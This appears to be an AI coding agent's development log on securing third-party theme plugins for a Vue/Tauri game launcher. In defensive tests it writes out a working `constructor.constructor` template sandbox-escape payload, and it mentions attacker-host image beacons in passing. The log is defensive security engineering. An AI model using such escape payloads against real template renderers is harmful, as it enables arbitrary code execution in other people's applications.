historical record; its actual conclusion (raw-JS/WASM component-override for external plugins is
blocked) is still correct and unaffected by the entry that replaces it in milestones.md.

Re-review requested directly: does Milestone 12/13 closing change the original Milestone 9
"blocked" verdict on the `slots` tier for external theme plugins? Worth actually re-deriving the
reasoning rather than reflexively re-affirming the old note, since the premise it was originally
conditioned on ("not pursued until/unless Milestone 12/13 land") had genuinely changed.
- Re-traced where Milestone 12's scoping actually lives before concluding anything -
  `grep`-confirmed `host::*` capability gating (path/URL allowlists, spawn-process permission
  gate) is implemented entirely inside `wasm_plugin_runtime.rs`/`wasm_plugins.rs`, i.e. the WASM
  host-function layer. That's the load-bearing fact: Milestone 12 scopes what a WASM plugin's
  own enumerated primitives can reach, a boundary that only exists *because* WASM plugins go
  through a typed host interface at all. Raw JS via `defineAsyncComponent` was never going to go
  through that layer - it runs directly in the app's own JS realm - so tightening that boundary
  has zero effect on the raw-JS option's actual exposure. The two didn't get closer together;
  Milestone 12 improved one lane (WASM) that was already separate from the other (raw JS) from
  the start
- Milestone 13 (signing, curated registry, revocation) doesn't move this either, for a different
  reason: it's a provenance/trust-in-the-author gate applied at install time, not a runtime
  capability boundary. A raw-JS theme bundle that's signed and registry-pinned is still, once
  running, full-realm code with unmediated access to every `#[tauri::command]` and every Pinia
  store in memory - proving "this came from that repo's CI" says nothing about what it's allowed
  to touch once it's executing
- Net verdict: still blocked, and for the *original* two reasons (WASM structurally can't carry
  a live Vue component; raw JS has no capability boundary to scope at all), not a new one -
  Milestone 12/13 closing was a real, legitimate reason to re-check, it just doesn't turn out to
  bear on this specific wall. Re-confirmed no third mechanism has emerged since Milestone 9's
  review either - the Vue-runtime-template-compiler idea documented there remains a different,
  narrower feature (a whitelisted template string) than an actual component-override tier, not a
  way to unblock `slots` itself. Closed Milestone 16 on this negative-but-final result rather
  than leaving it open pending some future condition that isn't currently identifiable

## Milestone 16 — External Theme Plugins: Constrained Template Tier (scoped, not built)
Prompted by a direct observation: Brick Block wasn't just a theme, it was Milestone 5's own
built-in proof that component-override themes have real demand and work as a mechanism. That
reframes the legacy Milestone 16 above - its "still blocked" verdict is about whether *external*
code can safely do what Brick Block does, not about whether the underlying idea (the Vue
template-compiler tier, noted since Milestone 9) is worth building. Rather than write that
verdict into milestones.md on vibes, measured it directly against Brick Block first.

- **Measured Brick Block's actual gap against the base `GameCard.vue`/`BigPictureTile.vue`,
  line by line**, instead of assuming `slots` themes are un-portable wholesale. Result: the part
  of Brick Block's identity that reads as "the theme" at a glance - its full color palette,
  `--font-pixel` - was *already* 100% `cssVariables`-portable and never depended on `slots` at
  all (it applies app-wide, to buttons/forms/nav, with zero component override). The real,
  `slots`-dependent gap was three things: (1) a static `★` glyph replacing the base's dynamic
  `{{ game.title.charAt(0).toUpperCase() }}` placeholder, (2) one extra wrapper element,
  `.brick-frame`, that the base tile has no equivalent of at all, (3) missing CSS-variable hooks
  on the base components for things Brick Block wants styled that the base never exposed as
  variables (balloon border, balloon `border-radius` override, per-element `font-family`). Of
  those three, (3) turned out to be a wholly separate, unrelated task - it's just base-component
  CSS not exposing enough knobs, fixable by adding variables to first-party code, nothing to do
  with any external-plugin mechanism at all
- **Checked whether the tier even needs the risky part of the original idea - `{{ }}`
  interpolation - against that measured gap**, rather than assuming the idea's own stated caveat
  ("interpolations are real evaluated JS, not inert") was the load-bearing risk here. It mostly
  isn't: Brick Block doesn't introduce a single non-trivial mustache expression - it *removes*
  the one the base had, replacing a computed method-call expression with static literal text.
  What survives unchanged from the base into Brick Block are simple directive/attribute bindings
  (`v-if="game.cover_art_url"`, `:src="game.cover_art_url"`, `:alt="game.title"`,
  `:class="{ focused }"`) - same expression-evaluation category as `{{ }}` (a real evaluated JS
  expression against a render-context scope), but the simplest possible slice of it: single-field
  property access, no method calls, no computed logic, no formatting helpers. So the concrete
  scope a whitelisted render context needs to cover, for this measured case, is narrower than
  the original note assumed - plain read-only access to `game`'s own fields, nothing more
- **Surfaced a real scope gap the original idea never accounted for**: Brick Block's footer
  buttons (`launchGame`/`fetchMetadata`/`openEdit`/`deleteGame`) are real store-action dispatches,
  not display data - and a template tier's whitelisted scope, as originally framed ("`game`
  fields plus known formatting helpers"), has no provision for exposing actions at all. Brick
  Block itself doesn't stress-test this - its footer is structurally identical to the base,
  reskinned only via CSS, never rearranged - so this specific measurement can't answer whether
  action-dispatch needs to be part of the tier. Left explicitly open in milestones.md rather than
  silently assumed either way, since a future theme that *does* want to restructure the action bar
  would hit this immediately
- Net effect: replaced the legacy Milestone 16 entry in milestones.md rather than appending
  alongside it - the new entry tracks a genuinely different, narrower mechanism (a scoped
  template tier) with a concrete measured basis (Brick Block) instead of the original's
  hypothetical Playnite-XAML comparison, and the legacy entry's own "blocked" conclusion (about
  `slots`/raw-JS specifically) stays correct and undisturbed above, kept for history rather than
  deleted

**Started the CSS-variable-surface expansion item.** Border-radius was already themeable
(`--radius-md`, used by the global `button` rule in `App.vue`) - the actual gap was border
*width*, hardcoded `1px` there with no variable at all. Added `--button-border-width` to
`:root` and wired it into the global `button` rule, rather than scoping a new variable to
GameCard's footer buttons specifically - explicit user direction: the lever should cover every
button app-wide, not just the ones next to a cover image, so a future theme can go
thick-bordered everywhere with one variable instead of needing `slots` just to reach GameCard's
footer. `GameCard.vue`'s own footer buttons needed no edit - they already inherit the global
`button` rule with no local override, so they pick up the new variable automatically. Brick
Block's own hardcoded `2px` footer-button border (in its scoped component CSS) is left as-is
for now rather than retroactively migrated to the new variable - a separate, deliberate call
for later, not bundled into this step. Balloon-specific hooks (border, `border-radius`
override, per-element `font-family` on `.balloon-title`/`.balloon-playtime`) remain the
outstanding part of this milestone item.

**Balloon hooks added, closing out the CSS-variable-surface item.** Unlike
`--button-border-width`, these follow the same undeclared-opt-in pattern as `--font-pixel`
(not registered in `App.vue`'s `:root` token scale, just referenced with a fallback at the
point of use) rather than the base design-token pattern - they're per-element hooks a theme
opts into, not a scale every element consumes by default:
- `.balloon`'s `border` gained `var(--balloon-border-width, 0)` (defaults to an invisible
  0-width border, matching prior behavior exactly for every existing theme that doesn't set it)
- `border-radius` changed from a hardcoded `var(--radius-sm)` to `var(--balloon-radius,
  var(--radius-sm))` - a dedicated per-element override rather than repurposing the shared
  `--radius-sm` token directly, since other `--radius-sm` consumers elsewhere in the app aren't
  necessarily meant to go sharp just because a theme wants a chunky balloon
- New `.balloon-title, .balloon-playtime { font-family: var(--balloon-font-family, inherit); }`
  rule - `inherit` as the fallback is behaviorally identical to the previous no-declaration
  state (already inherited from the teleported-to `<body>` ancestor), so no regression
- Brick Block's own `.brick-balloon` override is untouched and still wins by selector
  specificity (two classes beats one) - not migrated onto the new variables as part of this
  step, same deliberate deferral as the button-border-width case above

**Action-dispatch boundary decided: display/structure-only, no callable exposure.** A template
tier's whitelisted render context gets `game`'s own read-only fields, nothing else - the action
bar (play/edit/remove/fetch-metadata) is always host-rendered at a fixed insertion point,
restyleable via CSS variables (same lever as the button-frame/balloon work above) but not
restructurable, removable, or rearrangeable by a theme's template. Reasoning: Brick Block is the
only concrete evidence this app has ever had of component-override demand, and it never touches
the footer's structure at all - identical markup and `@click` handlers to the base, styled only
via CSS. Zero measured demand for restructuring the action bar exists. Exposing store actions as
template-callable would be real, non-trivial attack surface (a compiled template invoking
mutations, not just reading data) built speculatively for a need that's never once shown up -
the same over-scoping M16's re-review was built to avoid. If a real theme ever needs to
rearrange the action bar, that's new, separately-scoped work when it actually happens, not
designed in now against a hypothetical.

**Prototyped the naive template-compile approach - found it's a full sandbox escape, verified
empirically rather than assumed.** Added `@vue/compiler-dom` as an explicit dependency (was
already present transitively via `vue`, pinned to match `vue`'s own `^3.5.13` range rather than
relying on an undeclared transitive version). Before wiring anything into `GameCard.vue`, wrote
two throwaway Node scripts to test the exact mechanism devlog had been assuming was safe:
`compile(template)` from `@vue/compiler-dom`, then `new Function("Vue", code)(Vue)` to
materialize the render function - the same pattern the real Vue browser build uses internally
for `Vue.compile`/`compileToFunction`.
- **Test 1**: `{{ typeof window !== "undefined" ? window.secret : "no-window" }}`, with
  `globalThis.window = { secret: "LEAKED-FROM-GLOBAL" }` set beforehand. Compiled code wraps the
  expression in `with (_ctx) { ... }`, but `with` only intercepts identifiers *found on*
  `_ctx` - anything not found there resolves through the normal scope chain, which for a
  `new Function`-created function bottoms out at the real global object. Output:
  `"LEAKED-FROM-GLOBAL"` - confirms the earlier note in this file ("no reaching window/document
  unless explicitly put in scope") was wrong, and it was caught by testing before building on
  it, not after
  - This matters for something concretely: earlier, the risk-of-arbitrary-code question was
    debated for the *naive raw-remote-JS* `slots` alternative and judged clearly worse than
    WASM. This test shows the "constrained template" idea carries the identical risk via a
    completely different-looking mechanism (directive/mustache compilation instead of
    `import()`), just less obviously
- **Test 2, the more serious one**: `{{ game.constructor.constructor("return typeof process")() }}`
  with only `{ game: { title: "Test" } }` passed as context - no bare `window`/`document`
  identifier referenced at all. `game.constructor` is `Object`, `Object.constructor` is
  `Function`, and calling it executes arbitrary code - classic `constructor.constructor`
  sandbox escape (the same unfixable class of bug that made Google abandon AngularJS's
  expression sandbox in 1.x). Output: `"object"` (the real `typeof process` from the actual
  execution environment). This is the load-bearing finding - it means passing *only* `game`'s
  own fields into scope, the exact "safe, minimal whitelist" this milestone concluded was fine
  two entries above, is fully equivalent to raw JS execution. Freezing the context object
  doesn't help either - `Object.freeze` blocks writes, not reads of inherited `.constructor`.
  **Conclusion: the naive same-realm compile-and-eval approach is not being built.** It carries
  Milestone 9's original raw-JS verdict exactly, just less visibly

**Investigated real isolation instead of abandoning the tier outright**, per explicit
direction after reporting the escape - a dedicated Web Worker, rather than running the compiled
render in the main JS realm. Verified the two load-bearing claims concretely rather than
assuming a Worker actually helps:
- `grep`-confirmed `@tauri-apps/api/core.js`'s `invoke()` is literally
  `window.__TAURI_INTERNALS__.invoke(cmd, args, options)` - every Tauri command call is
  `window`-scoped by construction, not by convention. A `DedicatedWorkerGlobalScope` has no
  `window` at all (only `self`); referencing it is a real `ReferenceError`. A compiled-template
  escape running inside a Worker structurally cannot reach a single Tauri command - no
  file/process/registry/network host primitive, nothing
  - Same reasoning extends to Pinia stores - they live in the main thread's JS heap; a Worker is
    a genuinely separate execution context with its own heap, not just a different scope object,
    so there's no direct-memory-access path at all, unlike the raw-JS-`slots` case where a
    component literally runs in the same realm as every store
- Checked `tauri.conf.json`'s CSP (`connect-src ipc: http://ipc.localhost`, no separate
  `worker-src` set, which per spec falls back to `script-src 'self'` for the worker's own script
  loading). Workers inherit the owning document's CSP for their own outbound requests - so a
  fully-escaped worker's `fetch`/`XMLHttpRequest` calls are still restricted to
  `ipc:`/`http://ipc.localhost`, same lockdown the main thread already has. Real attacker
  exfiltration (a genuine `https://attacker.com` endpoint) stays blocked either way
- Already had indirect evidence the render pipeline itself has no hidden DOM dependency - both
  escape tests above ran the full `compile()` + `createElementBlock`/`toDisplayString` pipeline
  in plain Node (no `document`, no DOM shim) without error, so a Worker (which also lacks DOM)
  isn't blocked by the pipeline needing real DOM APIs it doesn't have
- Residual risk in this design, honestly stated rather than glossed: a compromised worker can
  still burn CPU/memory (mitigable with a render timeout + `worker.terminate()`), and the design
  needs one more real piece not yet built - since the worker has no DOM, it can't produce a live
  VNode tree with functions/Symbols in it (not structured-clone-able via `postMessage` anyway);
  it has to emit a **plain-data description** of the result (tag name, string/number children,
  known prop names only), and the main thread must treat that as inert data reconstructed
  against a strict allowlist - never execute or trust-render anything the worker sends without
  that revalidation step. That protocol + validator is real, unbuilt engineering, not a detail
- Paused here on explicit direction - findings logged, actual worker script/message-protocol/
  validator implementation not started this session. `@vue/compiler-dom` stays as an explicit
  dependency for when this is built (same package, same use, no churn from removing and
  re-adding it later)

**Tried a real data-only conversion of Brick Block, given the template tier is blocked for
now.** Added `brick-block-data-theme` to the `data-theme-plugins` repo (separate `id` from the
built-in `brick-block-theme` - same id would collide in the loader/`enabled_plugins`, they need
to coexist as genuinely different plugins, not the same one migrated). The built-in `slots`
version is untouched, not retired - this is a parallel, honestly-scoped alternative, not a
replacement.
- Full color palette carried over unchanged - was already 100% portable, as measured earlier
- Also carries the button-border-width/balloon-border-width/balloon-radius/balloon-font-family
  hooks added earlier this session - genuinely more of Brick Block's look is expressible now
  than it would have been before those were added
- **Real, not graceful, loss: the pixel font.** Data themes have zero code/asset-loading
  capability - `cssVariables` are plain property values, there's no way to inject an
  `@font-face` rule the way Brick Block's own `index.ts`'s `injectFont()` does. Checked whether
  the CSS stack's second choice, `"Press Start 2P"`, would at least provide *some* pixel-font
  fallback - it doesn't: `grep`-confirmed it's never actually loaded anywhere else in the app
  either (no bundled `@font-face`, no CDN link), so it was already unreachable in practice even
  in the built-in version unless a user happened to have that exact font installed system-wide.
  The data-theme version's `--balloon-font-family` therefore falls straight through to the
  default sans stack - the pixel-font identity is fully gone, not softened
- Also lost, both genuinely structural rather than stylable: the star-glyph cover placeholder
  (content, not CSS) and BigPictureTile's `.brick-frame` wrapper element (an extra DOM node the
  base tile has no equivalent of) - exactly the two items this milestone's Brick Block
  measurement already identified as needing the (currently blocked) template tier, now
  confirmed by an actual conversion attempt rather than the earlier static analysis alone

**Pivoted from Worker isolation to a JSON-AST rendering tier**, after weighing three outside
alternatives (Gemini's suggestions, brought back for a second opinion): iframe sandboxing,
server-driven UI via a JSON AST, and code-signed dynamic `import()`. Evaluated each against what
this milestone had already verified, not just in the abstract:
- **Code-signed dynamic import - rejected outright.** This is raw-JS `slots` with a signature
  check added. Milestone 13 already drew this exact distinction: signing proves *provenance*
  ("this really came from that repo's CI"), not *safety* - a malicious author's own CI signs
  their malicious code perfectly validly. Doesn't touch the actual problem (full realm access,
  `invoke()` reachable, Pinia reachable) at all - conflating signing with sandboxing was already
  identified as a mistake to avoid back in that milestone
- **Iframe sandboxing (`sandbox="allow-scripts"`, no `allow-same-origin`) - a real alternative
  to the Worker plan, comparable isolation, strictly more attack surface for capability this
  tier doesn't need.** An opaque-origin iframe can't reach the host's `window` or Pinia, same
  structural isolation property already verified for Workers - but unlike a Worker, it has a
  real `document`, so a compromised template inside it can still build actual DOM (phishing
  overlays, `<img src="https://attacker/...">` beacons) natively. Milestone 16 scoped this tier
  as display/structure-only with no ambition for live interactive UI, so the iframe's extra DOM
  power is pure unused risk here - worth it only if the tier's ambition ever grows past what's
  actually measured
- **JSON-AST / server-driven UI - adopted.** Fundamentally different in kind from both other
  options, not just a variant: there is no expression evaluator at all. A theme submits data
  (e.g. `{type: "if", test: {field: "cover_art_url"}, then: {type: "img", src: {field:
  "cover_art_url"}}, else: {type: "text", content: "★"}}`), and a hand-written interpreter -
  fully first-party code, no third-party input ever reaches `eval`/`with`/`new Function` -
  walks it, choosing tags from a fixed allowlist and resolving `{field: ...}` references via
  plain object property lookup. There's no `.constructor.constructor` escape possible because
  there's no code-execution primitive to escape *from* in the first place - the interpreter
  itself, not a sandboxed realm, is the entire security boundary. This sidesteps the exact bug
  class the compiler-dom prototype hit (verified above), and does it more cheaply than the
  Worker plan: no iframe/Worker, no postMessage structured-clone boundary, no output-validator
  layer needed, because nothing untrusted ever executes anywhere, contained or not
- Also matches Brick Block's measured gap precisely - conditional image-or-placeholder, static
  literal content, one wrapper element are all directly expressible as AST node types, and
  nothing measured needs more than that
- Worker isolation work above stays in devlog as a real, verified, sound design - not wrong,
  just superseded by a cheaper and stricter option found afterward. Milestone 16's plan now
  targets the AST vocabulary + interpreter instead of the worker/message-protocol/validator

**Designed the AST vocabulary**, kept deliberately small and validated directly against Brick
Block's two measured gap items rather than designed in the abstract:

```ts
type GameField = "cover_art_url" | "title";
type FieldTransform = "firstLetterUpper";
interface FieldRef { field: GameField; transform?: FieldTransform; }
type AstNode =
  | { type: "if"; test: FieldRef; then: AstNode; else?: AstNode }
  | { type: "element"; tag: "div" | "span"; class?: string; children?: AstNode[] }
  | { type: "image"; class?: string; src: FieldRef; alt: FieldRef }
  | { type: "text"; content?: string; field?: FieldRef };
```

- `image` is its own node type rather than `element` with a generic `attrs` bag - hardcodes
  exactly `src`/`alt` as bindable. No generic attribute dict exists anywhere in the format, so
  there's no future path for an arbitrary attribute name (`onerror`, a `style` containing
  `url(...)`) to ever reach the interpreter - closed by construction, not by a denylist that
  would need maintaining
- `FieldRef.field` is a closed enum, not arbitrary property access on `game` - an unrecognized
  field name should reject the whole manifest at install/parse time (fail closed), not silently
  render empty
- `transform` is a fixed enum dispatched by string match on the host side to a real named
  function - covers the base component's `charAt(0).toUpperCase()` need without introducing
  any method-call syntax into the format at all
- No event handlers, no interactive tags - `tag` enum is `div`/`span` only (plus the separate
  `image` node) - matches the already-decided action-dispatch boundary (footer stays
  host-rendered) by construction rather than by convention
- Validated against both Brick Block gap items: the glyph swap is a straightforward
  `if`/`image`/`else`-`text` tree; wrapping that same subtree in one more `element` node with
  `class: "brick-frame"` covers the wrapper-div gap too. Vocabulary is sufficient without being
  any bigger than what's actually needed
- One real residual risk flagged, not a code-execution one: a maliciously huge or deeply-nested
  manifest could still cost excessive render time/stack depth. Needs a depth cap (e.g. 5) and a
  total node-count cap (e.g. 50) enforced by the interpreter itself - a DoS guard to build
  alongside the interpreter, not a gap in the vocabulary's design

**Built the interpreter and verified it for real, not just typechecked.**
- `src/theme/cardVisualAst.ts` - `validateCardVisualAst` (the single gate untrusted manifest
  data passes through: closed `GameField`/`FieldTransform` enums, `MAX_DEPTH`/`MAX_NODES`
  caps, fail-closed on anything unrecognized) and `renderCardVisualAst` (only ever called on
  already-validated output, so the render path itself doesn't re-defend against malformed
  input on every call - the validator is the boundary, not the renderer). `text` nodes return a
  bare string rather than a wrapped element, so a themed placeholder's styling (set on its
  `element` parent) applies directly instead of through an extra spurious node
- `src/theme/cardVisualRegistry.ts` - validates once at theme-activation time (mirrors
  `slotRegistry.ts`'s shape), not per-render; an invalid AST logs and falls back to the built-in
  markup rather than breaking theme activation entirely
- `ThemePlugin.cardVisual?: unknown` - deliberately untyped as `AstNode` in the interface
  itself, since the raw value is untrusted regardless of which plugin kind it arrives from
  (TS-authored built-in vs. data-theme JSON) and always has to go through the validator before
  anything trusts it
- Wired into `GameCard.vue` (renders `CardVisualRenderer` when an active AST exists, falls back
  to the original `img`/`cover-placeholder` markup otherwise - footer/balloon/fetch-overlay
  untouched, matching the decided action-dispatch boundary) and `theme.ts`'s activate/deactivate
  lifecycle (parallel to `setActiveSlots`/`clearActiveSlots`)
- `bun run build` (vue-tsc + vite build) passes clean
- **Verified behavior directly**, not just "it typechecks" - wrote throwaway scripts (same
  pattern as the earlier compiler-dom escape tests) exercising the real module: (1) Brick
  Block's actual glyph-swap shape renders the image branch when `cover_art_url` is set and the
  `★` text branch when it isn't; (2) wrapping that same subtree in one more `element` node
  reproduces the `.brick-frame` wrapper case; (3) an unknown field name (tried smuggling
  `"constructor"` specifically, given what broke the compiler-dom prototype) is rejected;
  (4) an unknown node type (`"script"`) is rejected; (5) depth overflow and (6) node-count
  overflow both reject rather than silently truncating. All fail-closed, none silently coerced
- Both of Milestone 16's remaining build items (interpreter, acceptance test) are done. What's
  left: the manifest-signing addon, and the separately-tracked registry `theme`-kind follow-up

**Built the manifest-signing addon - Milestone 16 fully closed.** `verify_plugin_provenance`
(Milestone 13) turned out to already be fully generic - it just hashes and Sigstore-verifies
whatever `&[u8]` it's given, nothing WASM-specific in its own logic at all. The only real work
was threading a `manifest_url` parameter into `install_data_theme` (previously only took
`dir`/`manifest_bytes`, no URL - never needed one before) and calling the exact same
`parse_github_owner_repo`/`verify_plugin_provenance` pair `install_wasm_plugin` already uses,
against the manifest's own bytes instead of a `.wasm` binary.
- `install_data_theme` is now `async` (verification is a network call); both call sites updated
  (`install_plugin`'s dispatch, and the existing real-HTTP-round-trip test)
- Replaced the old hardcoded `verified: false, "Not applicable: data-only themes have no code
  to verify"` - that reasoning held when themes were colors-only, but a manifest carrying a
  `cardVisual` AST is real content worth tamper-detecting even though it's still never
  executable. Same asymmetry as the WASM path, stated in the new doc comment: this only proves
  the manifest is unmodified since that repo's CI published it, not that its author is
  trustworthy - that's the registry's review process once extended to a `theme` kind (see the
  separately-tracked follow-up), not this
- Frontend needed zero changes - `pluginInstall.ts`'s `InstallResult.verified`/
  `verificationNote` and its post-install toast were already generic across every plugin kind,
  never WASM-specific to begin with
- `cargo check` clean; full `cargo test` suite passes (4/4), including the updated real-HTTP
  round-trip test, now asserting `!result.verified` explicitly (a localhost test server isn't
  hosted on github.com, so this exercises the real "not verified" branch, not just the happy
  path)
- Milestone 16 is now fully closed: vocabulary, interpreter, acceptance test, signing addon.
  Only the deliberately-separate registry `theme`-kind follow-up remains outside its scope

**Registry `theme`-kind follow-up, done.** Real complication surfaced before writing anything:
`data-theme-plugins`' `release-themes.yml` deliberately reuses one release tag (`themes`)
across every push, for a stable freeform-install URL - checked, not assumed, and confirmed via
its actual workflow file. That means `.../releases/download/themes/<id>.json` is functionally
equivalent to `releases/latest/...`, the exact anti-pattern the registry's own README already
rejects (a future unrelated push could change that asset's bytes with zero new review ever
happening). Presented this to the user as a real fork rather than picking silently: change
`data-theme-plugins`' release model to match the WASM repos' per-version tags (breaks the
stable-URL property that model was built for), or pin against a commit-SHA'd
`raw.githubusercontent.com` URL instead (immutable regardless of the repo's own release model,
no changes needed there). Went with the latter.
- `registry.json` gained `brick-block-data-theme` - `manifestUrl` is
  `raw.githubusercontent.com/smh0505/data-theme-plugins/<commit-sha>/themes/brick-block-data-theme/manifest.json`
  (the exact commit that introduced the file, found via `git log -1 -- <path>`), `wasmSha256`
  is the real sha256 of that URL's actual bytes (fetched and hashed for real, not assumed)
- Caught a real mistake mid-edit: the `Edit` that added the new registry entry accidentally
  truncated the adjacent `rawg-wasm` entry's `wasmSha256` in the process (a copy-paste slip in
  the replacement string). Caught immediately by re-reading the file after the edit rather than
  trusting the diff blind, fixed before it ever reached a commit
- `scripts/validate.sh` branches on `kind` now: `theme` entries hash `manifestUrl`'s own bytes
  directly (no `.entry` sibling lookup - there's no separate binary for a data-only theme to
  begin with), every other kind keeps the existing sibling-`.wasm` logic unchanged. Pushed and
  confirmed the real CI run passes clean for the new entry, not just locally reasoned about
- README updated to document the new `kind` value, the differing pinning convention per kind,
  and that `theme` entries are added/re-pinned by hand - `data-theme-plugins` doesn't fire a
  release dispatch at all, and its shared-tag model doesn't fit `bump-entry.sh`'s
  tagged-release assumption anyway, so the automation built earlier this session doesn't
  (and isn't meant to) extend to this kind
- **Real gap caught on the Concourse side before considering this done**: `install_plugin`
  already accepted `expected_sha256` as a parameter, but only ever threaded it into
  `install_wasm_plugin` - `install_data_theme` had no hash-pin enforcement at all, meaning a
  theme registry entry's pinned hash would've been cosmetically present in `registry.json` but
  never actually checked at install time. Fixed by threading `expected_sha256` into
  `install_data_theme` too, hard-rejecting on mismatch against the manifest's own bytes -
  identical shape to `install_wasm_plugin`'s existing check. Added a real end-to-end test
  (`rejects_a_theme_whose_bytes_dont_match_the_pinned_hash`) against a real HTTP server, not a
  unit test of the hash comparison in isolation - confirms the install aborts and nothing gets
  written to disk. Full `cargo test` suite (5/5) and `bun run build` both pass clean

**Converted Brick Block into the new third-party system for real - caught a genuine bug the
unit tests never would have.** Before writing the manifest content, tried to reason about
whether `CardVisualRenderer`'s output would actually be styled correctly, rather than assuming
"the interpreter works, so this'll just work." It wouldn't have: `.cover`/`.cover-placeholder`
lived in `GameCard.vue`'s `<style scoped>` block, and Vue's scoped CSS works by compiling a
`data-v-<hash>` attribute onto every element *that specific component's own template* renders -
`CardVisualRenderer` is a separate component, so its `h()`-created elements would never carry
GameCard's scope attribute, and the scoped rule would have silently never matched them. Same
underlying category as why `.balloon` was already unscoped (Teleport breaks the parent-child
DOM relationship scoped CSS depends on) - a different mechanism breaking the same assumption.
Fixed by moving `.cover`/`.cover-placeholder` into the existing unscoped `<style>` block, and
verified the fix for real: checked the compiled CSS output and confirmed the selector has no
`[data-v-*]` qualifier anymore, rather than trusting the theoretical explanation alone.
- This is exactly the kind of gap the earlier interpreter unit tests couldn't have caught -
  they verified the AST validates and produces the right VNode *structure*, never that the
  result would actually be *styled* correctly once rendered through a real theme. Doing the
  real end-to-end conversion, not just trusting the component-level tests, is what surfaced it
- `brick-block-data-theme` (in `data-theme-plugins`) gained a `cardVisual` field reproducing
  the one real content difference this theme has from the default card - `★` instead of the
  dynamic first-letter placeholder - verified against Concourse's actual
  `validateCardVisualAst`/`renderCardVisualAst` (not just the repo's own schema validator,
  which doesn't understand AST content at all) before committing. Bumped to `1.1.0` (new
  capability, backward compatible)
- Re-pinned the registry entry to the new commit + freshly-computed hash - a genuine
  re-review-and-re-pin, not just a mechanical bump, since the content actually changed
- What's still out of scope, unchanged from the earlier "still just GameCard" decision:
  BigPictureTile has no equivalent AST region wired up at all, so its `.brick-frame` wrapper
  gap stays unaddressed - this conversion only closes GameCard's gap, matching what was
  actually built
- Full visual confirmation in the actual running Tauri app wasn't done this session - only
  automated/structural verification (compiled CSS, real validator/interpreter calls). Worth
  running the real app to eyeball it before calling this fully done

**Closed a real gap in theme parity: signing (Milestone 13) and the registry pin (Milestone 16
follow-up) are separate, complementary mechanisms, and only one of them actually existed for
themes.** User asked directly why a theme registry entry needs `wasmSha256` at all, given
`data-theme-plugins` was never wired with the same `actions/attest-build-provenance` step the
other 7 plugin repos got - re-checked that repo's `release-themes.yml` to confirm the absence
was real, not assumed. Consequence: `verify_plugin_provenance` would call out to GitHub's
attestations API on every theme install and always come back "not verified," not because
anything was broken but because that CI step had simply never been added there. For themes,
the registry pin wasn't a redundant second layer the way it is for WASM plugins - it was the
*only* integrity check that existed at all.
- Added the same `id-token: write`/`attestations: write` permissions and
  `actions/attest-build-provenance@v2` step to `data-theme-plugins`' `release-themes.yml`,
  `subject-path: "dist/*.json"` (a glob) producing one attestation per theme in a single step
  rather than a step per theme - a data-only theme has no binary, so the manifest itself (now
  the release asset, already renamed to `<id>.json`) is what gets attested
- Verified the signing actually took effect for real, not just "the workflow ran green": the
  push that added the CI step didn't itself trigger a run (path filter only watches
  `themes/**`, same gotcha hit earlier with the plugin repos' notify-registry step), so used
  `gh workflow run --repo ... workflow_dispatch` to force a real run instead of introducing a
  spurious `themes/**` commit just to trigger one. Then ran `gh attestation verify` against the
  actual published `brick-block-data-theme.json` - exit code 0, no visible summary text
  (a rendering quirk in this shell, not a real problem) - confirmed by also running the same
  command against the *wrong* repo and getting a real, visible `HTTP 404` and exit code 1,
  proving the tool genuinely round-trips to GitHub's attestations API rather than trivially
  passing
- Added `midnight-neon-theme` and `sakura-theme` to `concourse-plugin-registry` too, completing
  registry coverage for all three themes in the repo (previously only Brick Block had an
  entry). Both reviewed (plain `cssVariables`, nothing exotic) and pinned the same
  commit-SHA'd-raw-URL way as Brick Block's entry, for the same reason (the shared-tag release
  model doesn't fit a tagged-release convention). All three themes now have both signing
  (repo-wide CI, just added) and a reviewed registry pin (per-theme, just added) - full parity
  with how the 8 WASM/metadata/wrapper plugin repos are already covered

**Extended the registry's version-bump automation (built earlier this session for the 8
WASM/metadata/wrapper repos) to cover themes too - a real redesign, not a copy-paste.** The
existing dispatch/bump mechanism assumed one repo maps to exactly one registry entry (true for
all 8 of those repos) - `data-theme-plugins` breaks that assumption outright, hosting three
themes (three separate registry entries) in one repo. Matching a dispatch by `repo` alone, the
way `bump-entry.sh` did, would have updated all three entries at once regardless of which
theme actually changed.
- `bump-entry.sh` rewritten to match by `id` instead of `repo` - `id` is already guaranteed
  unique per registry entry (unlike `repo`, now shared three ways), so it's the correct primary
  key regardless of how many entries a given repo ends up hosting. `repo` is read back off the
  matched entry itself rather than passed in separately. Also branches on the matched entry's
  own `kind` (reusing the same theme-vs-everything-else logic `validate.sh` already had) to
  build either a tagged-release URL+hash or a commit-pinned raw URL+hash
- Payload shape changed from `{repo, tag}` to `{id, ref}` uniformly - `ref` is a version tag for
  source/wrapper/metadata entries, a commit SHA for theme entries. Propagated to all 8 existing
  plugin repos' `publish.yml` (each now reads its own `id` from `plugin.json` at dispatch time
  via `jq`, rather than relying on `github.repository`)
- Hit a real, reproducible bug while propagating the payload change across those 8 repos: a
  plain Python string-replace script skipped `rawg-metadata-wasm-plugin` silently. Root cause -
  that file had CRLF line endings (from an earlier `Edit`-tool touch this session), the other 7
  had plain LF (appended via a raw Bash heredoc originally), so an exact-substring match against
  an LF-only pattern never matched. Caught by actually diffing the file against the expected
  block rather than assuming the skip meant "already patched," fixed by normalizing line
  endings before matching and re-applying the target's original style on write
- `data-theme-plugins`' `release-themes.yml` gained: `fetch-depth: 0` on checkout (needed to
  diff `github.event.before` against `github.sha`), a step computing which theme(s) actually
  changed in *this specific push* (this workflow re-validates/republishes every theme on every
  push regardless of which one changed, so dispatching unconditionally would open a no-op PR
  for every untouched theme alongside the one real change - only meaningful for `push` events,
  skipped on manual `workflow_dispatch` since there's no `before` commit to diff against), and a
  dispatch step per changed theme carrying `github.sha` as `ref`
- Manual step still outstanding, not something this session can do: `REGISTRY_DISPATCH_TOKEN`
  secret needs setting on `data-theme-plugins` (same PAT pattern as the 8 plugin repos) -
  can't be done here since the token value was never retained after the user set it earlier,
  by design (shouldn't sit in chat history). Asked the user to run `gh secret set
  REGISTRY_DISPATCH_TOKEN --repo smh0505/data-theme-plugins` themselves
- README updated to correct its own now-stale claim ("theme entries are added/re-pinned by
  hand, not through the release-dispatch automation") now that this is wired up
- Not yet verified end-to-end against a real push (blocked on the secret above) - the
  push-vs-workflow_dispatch distinction and the CRLF bug were both caught through direct
  inspection/testing of the scripts and files themselves, not a live dispatch test yet

**Verified end-to-end for real, once the secret was set.** Bumped `sakura-theme` to `1.0.2`
(patch, no functional change - solely to exercise the chain) and pushed a real commit rather
than using `workflow_dispatch`, since the dispatch step is deliberately guarded to `push` only.
Full chain confirmed:
